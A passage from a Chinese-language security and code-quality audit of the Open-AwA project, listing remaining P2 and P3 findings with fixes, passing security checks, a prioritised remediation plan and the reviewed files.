**问题位置**：[frontend/src/features/vibe-coding/components/TerminalPane.tsx:195-201](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/TerminalPane.tsx#L195)

**修复方案**：使用 zod 或手动校验所有字段类型后再使用。

---

### P2-24 chat 与 vibe-coding 各有一个 PermissionDialog

**审查来源**：前端审查 W9
**问题位置**：
- [frontend/src/features/chat/components/PermissionDialog.tsx](file:///d:/代码/Open-AwA/frontend/src/features/chat/components/PermissionDialog.tsx)
- [frontend/src/features/vibe-coding/components/PermissionDialog.tsx](file:///d:/代码/Open-AwA/frontend/src/features/vibe-coding/components/PermissionDialog.tsx)

**修复方案**：抽象为统一的 PermissionDialog 组件，支持两种数据形态。

---

### P2-25 auth.py 登出未写审计日志

**审查来源**：API 路由审查 W13
**问题位置**：[backend/api/routes/auth.py:149-187](file:///d:/代码/Open-AwA/backend/api/routes/auth.py#L149)

**修复方案**：登出成功/失败均应调用 `AuditLogger.log_auth_event` 写入审计表。

---

### P2-26 bleach 是可选依赖

**审查来源**：API 路由审查 W12
**问题位置**：[backend/api/routes/coding.py:486-493](file:///d:/代码/Open-AwA/backend/api/routes/coding.py#L486)

**修复方案**：在 `requirements.txt` 中将 `bleach` 列为强依赖。

---

## 四、警告（P3，类型规范与小问题）

### P3-1 preview_proxy.py 未导入 Optional

**审查来源**：ACP 审查 W13
**问题位置**：[backend/api/routes/preview_proxy.py:50](file:///d:/代码/Open-AwA/backend/api/routes/preview_proxy.py#L50)

**修复方案**：`from typing import Optional` 或改用 `str | None`。

---

### P3-2 discover_agents 静默吞导入异常

**审查来源**：ACP 审查 W14
**问题位置**：[backend/acp_host/agents/__init__.py:50-52](file:///d:/代码/Open-AwA/backend/acp_host/agents/__init__.py#L50)

**修复方案**：`except Exception as e: logger.debug(f"skip agent module {module_name}: {e}"); continue`。

---

### P3-3 cancel_turn except Exception 过宽

**审查来源**：ACP 审查 W15
**问题位置**：[backend/acp_host/service.py:373-374](file:///d:/代码/Open-AwA/backend/acp_host/service.py#L373)

**修复方案**：单独捕获 `asyncio.CancelledError` 重新 raise，其余 `Exception` 记录后 break。

---

### P3-4 类型标注缺失

**审查来源**：后端 LLM 审查
**问题位置**：
- [backend/core/feedback.py:22](file:///d:/代码/Open-AwA/backend/core/feedback.py#L22) `set_memory_manager` 缺类型
- [backend/core/executor.py:2239](file:///d:/代码/Open-AwA/backend/core/executor.py#L2239) 裸 dict
- [backend/core/coding/claude_code.py:283-296](file:///d:/代码/Open-AwA/backend/core/coding/claude_code.py#L283) 小写 dict 风格

**修复方案**：统一为 `Dict[str, Any]`，补全类型标注。

---

### P3-5 chat.py 上传 metadata 文件名拼接

**审查来源**：API 路由审查 W7
**问题位置**：[backend/api/routes/chat.py:60](file:///d:/代码/Open-AwA/backend/api/routes/chat.py#L60)

**修复方案**：显式 `Path(filename).name` 取 basename 防御性兜底。

---

## 五、通过项摘要

### 后端 LLM 调用 PASS 项

- **安全性**：API Key 加密存储（`enc2:` + Fernet）、`decrypt_secret_value()` 解密、`enc:` 旧密文主动失效检测、PII 过滤、Bearer token 自动脱敏、文件上传安全（白名单 + UUID + 大小限制）、命令沙箱（白名单 + 黑名单 + 危险参数正则 + `create_subprocess_exec` 非 shell 模式）、路径穿越五层防护
- **超时与重试**：非流式 `asyncio.wait_for` 包装、流式 chunk 超时 120s、指数退避 + 随机抖动、速率限制智能退避（Retry-After 优先）、每供应商熔断器（连续失败 5 次熔断、60s 半开恢复）、工具调用循环连续错误阈值 3 次、命令执行 30s 超时 + 进程 kill 清理
- **资源管理**：`close_shared_client()` 在 lifespan shutdown 注册、流式 response `try/finally + aclose()`、WebSocket db.close() 在 finally、SSE 生成器 finally 发送 `[DONE]`、子代理流消费 finally aclose
- **错误处理**：异常类型具体化、关键路径错误传播、降级策略（LiteLLM 不可用抛 RuntimeError；熔断器开启返回 503；ACP SDK 缺失优雅降级）、错误响应统一结构 `build_standard_error()`、`record_explicit_feedback` 显式 rollback + raise
- **并发安全**：httpx 连接池线程安全、熔断器 `asyncio.Lock` 保护、`_circuit_breakers` 字典 `threading.Lock` 双重检查锁定、工具调用循环 messages 列表本地修改、同步文件 I/O 用 `asyncio.to_thread` 包装、WebSocket 鉴权独立短生命周期 Session
- **性能**：LLM 复用连接池 `httpx.Limits(max_connections=100, max_keepalive_connections=20)`、自动上下文压缩 `CompactionManager`、工具结果截断 `MAX_TOOL_RESULT_CHARS=8000`、工具执行幂等缓存 LRU、历史查询分页上限 1000
- **类型安全**：关键函数完整类型标注、Optional/Union 正确使用、None 安全显式检查

### ACP 协议 PASS 项

- **子进程安全（部分）**：command/args 来自硬编码配置无 shell 注入；`acp.py` 的 `_validate_cwd` 正确使用 `resolve()` + `relative_to()` 防路径越权
- **进程树清理（部分）**：psutil 可用时 `children(recursive=True)` 递归 kill 正确；Windows `taskkill /F /T` 正确；`AsyncExitStack.aclose()` 在 finally 调用；`atexit.register` 已注册
- **Permission 安全（部分）**：`resolve_option_by_id` 严格校验 option_id；硬阻断覆盖 4 类核心危险命令；SDK 缺失时 `cancelled_response` 优雅降级
- **SSE 流式安全（部分）**：`_format_sse` 用 `json.dumps` 正确转义；`media_type="text/event-stream"` + `Cache-Control: no-cache` 设置正确；客户端断开时 `asyncio.CancelledError` 捕获后调用 `cancel_turn` 清理；30s 心跳保活
- **WebSocket 安全（部分）**：两条 WS 端点均强制 token 鉴权，无效/过期 token 关闭连接（4001/4002/4003）；DB 查询用 `asyncio.to_thread` + 独立 `SessionLocal`；断线重连正确恢复 scrollback（100 行）+ snapshot + shell_info
- **反向代理 SSRF**：端口范围 1024-65535、目标主机硬编码 `127.0.0.1`、`urlsplit` 重新组装强制覆盖 netloc 防 path 注入、`httpx.AsyncClient(timeout=30.0)` 设置超时、hop-by-hop 头过滤
- **文件预览安全（部分）**：`_validate_file_path` 用 `realpath` + `startswith(root + os.sep)` 正确防穿越；Markdown 用 bleach 净化 tags/attributes/protocols 白名单严格（`javascript:` URL 被 strip）；Office 可选依赖缺失时降级为下载链接；Range 请求边界校验完整
- **通知 API 安全**：所有端点 `Depends(get_current_user)`、按 `user_id` 隔离 buffer 与 subscribers、`deque(maxlen=100)` 限制单用户通知数、`notification_type` 白名单生效、SSE 断开时 `subs.discard(queue)` 在 finally 清理

### 前端 PASS 项

- **SSE 流式处理**：partial reads（半包拼接）处理正确、区分 `event:` 类型、AbortController 在组件卸载时正确 abort、AbortError 正确识别、网络错误重试（仅零数据时重试 1 次）
- **WebSocket 管理**：连接 URL 构造正确（http→ws / https→wss）、onopen/onmessage/onerror/onclose 完整实现、指数退避 1s→30s、重连恢复 scrollback + snapshot、组件卸载关闭 WebSocket + 清理所有回调
- **资源管理**：URL.createObjectURL 卸载时 revokeObjectURL、EventSource 卸载时 close、xterm.js Terminal 卸载时 dispose、定时器卸载时 clearTimeout、事件监听器卸载时 removeEventListener
- **错误处理**：fetch/axios 错误正确捕获、错误友好展示（不暴露技术细节）、AbortError 正确识别、loading 状态在错误时正确重置、错误日志包含 request_id 上下文
- **类型安全**：主要使用 unknown 而非 any、API 响应类型完整定义、Optional 字段正确处理、函数签名完整类型标注
- **性能**：React.memo 用于纯展示组件、useMemo 缓存计算、useCallback 稳定化函数、Zustand selector 原子化、流式渲染节流
- **并发与竞态**：多个 SSE 请求互斥（requestId 比较）、状态更新使用函数式、创建会话按钮防重复点击
- **权限审批 UX**：完整展示工具名/kind/target/action/summary/command/paths/options、onSelect 正确调用 API、取消按钮正确处理、loading 状态展示、提交时禁用其他按钮防并发

### API 路由层 PASS 项

- **JWT 黑名单**：每次请求查 `is_token_blacklisted`；登出时 `add_to_blacklist(jti, db)`
- **Cookie 安全**：`httponly=True`、`samesite="lax"`、生产环境 `secure=True`
- **CSRF 防护**：per-session 签名 token、校验 user_id 一致性、API Key Bearer 豁免合理
- **输入校验**：全部 BaseModel、关键字段 `max_length/ge/le`、AttachmentItem.data 14MB 上限
- **文件上传**：扩展名白名单 + 10MB 大小限制 + UUID 文件名 + owner_id metadata 校验
- **路径校验（sandbox）**：五层路径校验（deny → TOCTOU → 内部 → 工作目录 → 白名单 → 默认拒绝）
- **SSE 流式响应**：`Cache-Control: no-cache, no-transform`、`X-Accel-Buffering: no`、`Connection: keep-alive`、客户端断开 `asyncio.CancelledError` 正确处理
- **反向代理 SSRF**：强制 127.0.0.1、端口 1024-65535、丢弃 hop-by-hop headers、固定 Host 头、`follow_redirects=False`、30s 超时
- **SQL 注入**：全部使用 SQLAlchemy ORM 参数化查询
- **XSS 防护**：bleach 净化 + 标签/属性白名单；降级时 `html.escape`
- **敏感信息保护**：PII 检测与脱敏；`sanitize_for_logging`；全局异常处理器返回通用错误不泄漏堆栈
- **审计日志**：DB + 文件降级；`log_auth_event` / `log_tool_usage` / `log_file_operation` 齐全
- **速率限制（登录）**：5 次/5min + 15min 封禁；支持 memory/database 双后端，跨 worker 一致

---

## 六、修复优先级与建议执行顺序

### 第一批（P0，立即修复，1-2 天内完成）

| 序号 | 问题 | 影响范围 | 工作量估计 |
|------|------|----------|------------|
| P0-1 | 终端/PTY 会话 IDOR | terminal.py 多端点 | 中（增加 owner_user_id 字段 + 所有端点校验） |
| P0-2 | WebSocket Origin 校验 | chat.py + terminal.py | 小（3 处 WS 端点） |
| P0-3 | CSP connect-src 收紧 | main.py | 小（1 行） |
| P0-4 | Coding API 接入 RBAC 与 sandbox | coding.py | 中（read_file/write_file/preview_file） |
| P0-5 | PTY 持续校验命令 | terminal.py write_input | 中（需处理多行/续行） |
| P0-6 | ACP 子进程环境变量过滤 | acp_host/service.py | 小（_build_safe_env 函数） |
| P0-7 | ACP 权限路径前缀匹配修复 | acp_host/permissions.py | 小（1 行改用 relative_to） |
| P0-8 | WebSocket token 改用子协议 | 后端 terminal.py + 前端 TerminalPane.tsx | 中（前后端联动） |
| P0-9 | 恢复 CSRF 保护 | 前端 client.ts + api.ts | 中（拦截器 + 启动拉取 token） |
| P0-10 | prompt 输入 maxLength | 前端 ChatInput + AcpSessionPanel | 小（2 处 textarea） |
| P0-11 | FilePreviewPane DOMPurify | 前端 FilePreviewPane.tsx | 小（npm install + 1 行） |
| P0-12 | SSE 最大响应大小限制 | 前端 api.ts + AcpSessionPanel | 小（while 循环计数） |
| P0-13 | WebSocket 消息大小限制 | 后端 uvicorn 启动参数 | 小（1 行配置） |
| P0-14 | 模块级字典 LRU 上限 | acp.py + terminal.py + notifications.py | 中（替换为 LRUCache） |

### 第二批（P1，本周内修复）

P1-1 至 P1-14，主要涉及 LLM 调用 SSRF 防护、permission 超时、限流、心跳、SVG XSS、permission 队列、schema 一致性、异常处理收紧、资源泄露、连接池加锁等。

### 第三批（P2，下个迭代修复）

P2-1 至 P2-26，主要涉及硬阻断模式完善、审计日志、POSIX 进程组 kill、SSE 队列上限、CORS LAN 收紧、API Key 存储优化、WS 重连次数、iframe sandbox、错误信息脱敏、LSP 异常细化、git_log 上界、ClaudeCodeAdapter 异步化、PermissionDialog 统一、登出审计、bleach 强依赖等。

### 第四批（P3，类型规范）

P3-1 至 P3-5，主要涉及 Optional 导入、discover_agents 异常日志、cancel_turn 异常分类、类型标注补全、文件名 basename 兜底。

---

## 七、建议的执行策略

1. **优先修复 P0-1（终端 IDOR）与 P0-6（环境变量泄露）**：这两项是真实可利用的安全漏洞，可能直接导致密钥泄露
2. **P0-2/P0-3/P0-13 联合修复**：WebSocket 三件套（Origin + CSP + 消息大小），一次性提升 WS 安全基线
3. **P0-8/P0-9 联合修复**：前端认证机制重构（CSRF + WS token 子协议），涉及前后端联动，建议同一 PR 完成
4. **P0-4/P0-5 联合修复**：Coding/terminal 安全统一接入 `security.sandbox`，复用现有沙箱基础设施
5. **P0-7 单独修复**：1 行代码改动，立即可上线
6. **P0-10/P0-11/P0-12 一起修复**：前端三处输入校验与渲染安全，集中修复减少回归测试
7. **P0-14 单独修复**：模块级字典 LRU 改造，需评估对现有会话清理逻辑的影响

每批修复完成后运行：
```powershell
.\scripts\code-audit.ps1 -SkipTests
cd backend; pytest -x --tb=short; cd ..
cd frontend; npm run typecheck; npm run lint; npm run test; cd ..
```

---

## 八、附录：审查覆盖文件清单

### 后端 LLM 调用审查（8 文件 + 9 支撑文件）
- `backend/core/model_service.py`、`agent.py`、`comprehension.py`、`planner.py`、`executor.py`、`feedback.py`
- `backend/core/coding/claude_code.py`、`backend/api/routes/chat.py`
- 支撑文件：`config/security.py`、`config/logging.py`、`api/schemas.py`、`api/services/chat_protocol.py`、`api/routes/preview_proxy.py`、`security/sandbox.py`、`billing/pricing_manager.py`、`core/litellm_adapter.py`、`main.py`

### ACP 协议 AI 调用审查（14 文件，约 4200 行）
- `backend/acp_host/{__init__,core,client,service,permissions,tool_adapter}.py`
- `backend/acp_host/agents/__init__.py` + 4 个 agent 配置
- `backend/api/routes/{acp,terminal,preview_proxy,coding,notifications}.py`
- `backend/core/terminal/{vt_screen,pty_session}.py`

### 前端 AI 调用审查（15 文件）
- `frontend/src/shared/api/{api,client,acpApi,notificationsApi,terminalApi}.ts`
- `frontend/src/features/vibe-coding/VibeCodingPage.tsx` + 7 个组件
- `frontend/src/features/chat/{hooks,components}/*`

### API 路由层安全审查（17 文件）
- `backend/api/routes/{chat,acp,coding,terminal,preview_proxy,notifications,auth}.py`
- `backend/api/{dependencies,schemas}.py`、`backend/main.py`
- `backend/security/{rbac,audit,permission,sandbox,pii,rate_limit_store}.py`
- `backend/core/coding/claude_code.py`、`backend/api/services/chat_protocol.py`、`backend/config/security.py`

---

**审查结论**：项目整体安全基线扎实（认证、CSRF、Sandbox、审计、限流均有实现），ACP 集成模块（spec `integrate-vibe-coding-agents-via-acp`）架构清晰、降级处理规范。主要风险集中在**终端会话 IDOR**、**ACP 子进程环境变量泄露**、**WebSocket 三件套**（Origin/CSP/消息大小）、**Coding API RBAC 缺失**四个方面，需优先修复 P0 级别 14 项问题。
